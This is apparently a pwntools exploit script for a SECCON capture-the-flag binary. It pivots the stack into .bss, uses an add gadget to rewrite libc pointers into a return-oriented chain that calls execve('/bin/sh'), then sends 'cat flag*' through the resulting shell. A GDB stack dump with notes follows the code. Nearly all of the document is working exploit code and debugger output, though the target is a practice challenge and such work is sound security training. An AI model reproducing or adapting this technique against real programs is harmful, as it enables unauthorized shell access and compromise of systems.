#!/usr/bin/env python3
from pwn import *

context.terminal = ['/usr/bin/kitty']
context.encoding = 'latin'
context.binary = elf = ELF('./chall_patched')
context.log_level = 'debug'

gs = """

b main
c
"""

# p = process(elf.file.name)
# p = gdb.debug(elf.file.name, gdbscript = gs, aslr=True)
p = remote('mrga.seccon.games', 7428)

def remote_poc():
    p.recvline()
    cmd = p.recvline()
    print(cmd.decode())
    p.sendline(input().strip())

remote_poc()

add_gadget = 0x000000000040115c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
leave_ret = 0x00000000004011d4
ret = leave_ret + 1
execve_syscall = 0x00000000000eef34
pop_rdx_etal = 0x00000000000b502c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
main_gadget = elf.sym['main'] + 17
pop_rbp = 0x000000000040115d
bss = elf.bss(0x510)

payload = flat(
    'a' * 0x10,
    bss,
    main_gadget,
)

input("stack pivot 1")
p.sendlineafter(b">\n", payload)

bss = elf.bss(0x810)
payload = flat(
    'a' * 0x10,
    bss,
    main_gadget,
)

input("wtf")
p.sendline(payload)

payload = flat(
    'b' * 0x10,
    bss-0x70+0x10,  # rsp - 0x70 (overwrite ret of getline info)
    main_gadget,
)

input("wtf 2")
p.sendline(payload)

def setregs(rbx=0, r12=0, r13=0, r14=0, r15=0, rbp=0):
    buffer = flat(
        {
            0x08: rbx,
            0x10: r12,
            0x18: r13,
            0x20: r14,
            0x28: r15,
            0x30: rbp,
        },
        filler = b'\x69'
    )

    return buffer

# payload = flat(
#     b'a' * 0x8,
#     0,    # one_gadget offset to add gadget
#     b'b' * 0x28,
#     pop_rbp, 0x404468+0x3d, # location of a libc address to add one_gadget offset
#     add_gadget,
#     # pop_rbp, 0x404798+0x10,  # rsp - 0x70 (overwrite ret of getline info)
#     pop_rbp, 0x404468-0x8,
#     leave_ret
# )

def add_addr32(where, what, getline_info_rip):
    payload = flat(
        setregs(rbx=what, rbp=where+0x3d),
        # pop_rbp, where+0x3d,
        ret, ret,
        add_gadget,
        pop_rbp, getline_info_rip-0x70+0x10,
        main_gadget
    )
    input("break")
    p.sendline(payload)

add_addr32(0x404428, 0x22897, 0x404808)  # pop rdx
add_addr32(0x404458, 0xfff0d16d, 0x404808-0x18) # pop rsi
add_addr32(0x404460, 0xffbfbb80, 0x404808-0x18-0x18)  # zero it
add_addr32(0x404468, 0x7a199, 0x404808-0x18-0x18-0x18)  # pop rdi
add_addr32(0x404478, 0xffeeb654, 0x404808-0x18-0x18-0x18-0x18)  # execve syscall


payload = flat(
    setregs(rbx=0, rbp=0x404428-8, r12=1,r13=2,r15=4,r14=3),
    ret, ret,
    leave_ret,
    b'a' * 168,
    b'/bin/sh\0'
)

input("get shell")
p.sendline(payload)

time.sleep(1)
p.sendline("cat flag*")
p.interactive()
"""
85:0428│  0x404428 —▸ 0x762dc8c92795 (__GI__IO_file_underflow+357) ◂— test rax, rax : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
86:0430│  0x404430 ◂— 0 
87:0438│  0x404438 —▸ 0x762dc8e038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
88:0440│  0x404440 —▸ 0x762dc8e02030 (_IO_file_jumps) ◂— 0
89:0448│  0x404448 ◂— 0x7fffffe0
8a:0450│  0x404450 —▸ 0x762dc8e03964 (_IO_2_1_stdin_+132) ◂— 0xc8e0572000000000
8b:0458│  0x404458 —▸ 0x762dc8e038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b                             : pop rsi
8c:0460│  0x404460 —▸ 0x404480 —▸ 0x4044e0 —▸ 0x404520 —▸ 0x404820 ◂— ...
8d:0468│  0x404468 —▸ 0x762dc8c955c2 (_IO_default_uflow+50) ◂— cmp eax, -1                        : pop rdi
8e:0470│  0x404470 —▸ 0x404830 ◂— 0x6161616161616171 ('qaaaaaaa')                      : write /bin/sh
8f:0478│  0x404478 —▸ 0x762dc8e038e0 (_IO_2_1_stdin_) ◂— 0xfbad208b                     : execve syscall
"""